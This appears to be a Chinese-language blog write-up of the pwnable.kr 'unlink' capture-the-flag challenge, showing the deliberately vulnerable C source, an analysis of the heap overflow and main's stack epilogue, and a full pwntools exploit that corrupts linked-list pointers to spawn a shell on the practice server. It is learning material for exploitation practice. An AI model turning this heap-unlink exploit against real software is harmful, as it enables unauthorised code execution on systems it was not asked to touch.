---
title: kr_unlink
date: 2020-02-04 23:21:02
tags:
- pwn
- pwnable.kr
---

# pwnable.kr unlink

### 0x0 基础知识

[CTF Wiki unlink](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/)

CTF all in one 中 unlink部分

### 0x1 分析

先看安全性

![](https://i.loli.net/2020/02/04/SbQ1nz8qFDfgRP5.png)

看来栈上和堆上的代码是不能执行的。但是没有canary。地址也是固定的。

看一下源代码梳理一下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
        struct tagOBJ* fd;
        struct tagOBJ* bk;
        char buf[8];
}OBJ;

void shell(){
        system("/bin/sh");
}

void unlink(OBJ* P){
        OBJ* BK;
        OBJ* FD;
        BK=P->bk;
        FD=P->fd;
        FD->bk=BK;
        BK->fd=FD;
}
int main(int argc, char* argv[]){
        malloc(1024);
        OBJ* A = (OBJ*)malloc(sizeof(OBJ));
        OBJ* B = (OBJ*)malloc(sizeof(OBJ));
        OBJ* C = (OBJ*)malloc(sizeof(OBJ));

        // double linked list: A <-> B <-> C
        A->fd = B;
        B->bk = A;
        B->fd = C;
        C->bk = B;

        printf("here is stack address leak: %p\n", &A);
        printf("here is heap address leak: %p\n", A);
        printf("now that you have leaks, get shell!\n");
        // heap overflow!
        gets(A->buf);

        // exploit this unlink!
        unlink(B);
        return 0;
}
```



很明显是在`gets(A->buf);`这里实现堆溢出。然后利用unlink函数来处理问题。

那么这里一个堆的结构是这样的

| presize | size   |
| :------ | ------ |
| FD      | BK     |
| buffer  | buffer |

然后按照`unlink`函数，也就是：

`P->fd->bk = P->bk`

`P->bk->fd = P->fd`

按照这个思路。 `P->bk->fd`应该指向栈上的相应位置比如`ret`位置（但这道题不是。）。`P->fd`应该指向的位置应该存储`shell`函数的起始地址。

但是看到`main`函数的汇编代码最后部分：

```assembly
; var int local_4h_2 @ ebp-0x4
0x080485ff      8b4dfc         mov ecx, dword [local_4h_2]
0x08048602      c9             leave
0x08048603      8d61fc         lea esp, dword [ecx - 4]
0x08048606      c3             ret
```

所以。这里`P->bk->fd`应该指向`ebp-0x4`的位置。

先通过输出获取A chunk的`heap`和`stack`位置。然后计算出B chunk的`fd`和`bk`应该指向的位置。构建`payload`。

### 0x2 EXP

```python
#!/usr/bin/python
#-*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'

shell_addr = 0x080484eb
payload = p32(shell_addr) + p32(0)
s =  ssh(host='pwnable.kr',
                 port=2222,
                 user='unlink',
                 password='guest'                         
                 )
p = s.process("./unlink")
#p = process('./unlink')
p.recvuntil('address leak: ')
A_stack = p.recv(10)
bk = eval(A_stack) + 0x10
print bk
#pause()
p.recvuntil('address leak: ')
A_heap = p.recv(10)
fd = eval(A_heap) + 0xc 
print fd
#pause()
payload = payload + p32(0) + p32(0) + p32(fd) + p32(bk) 
p.sendlineafter("now that you have leaks, get shell!\n", payload)
p.interactive()
```

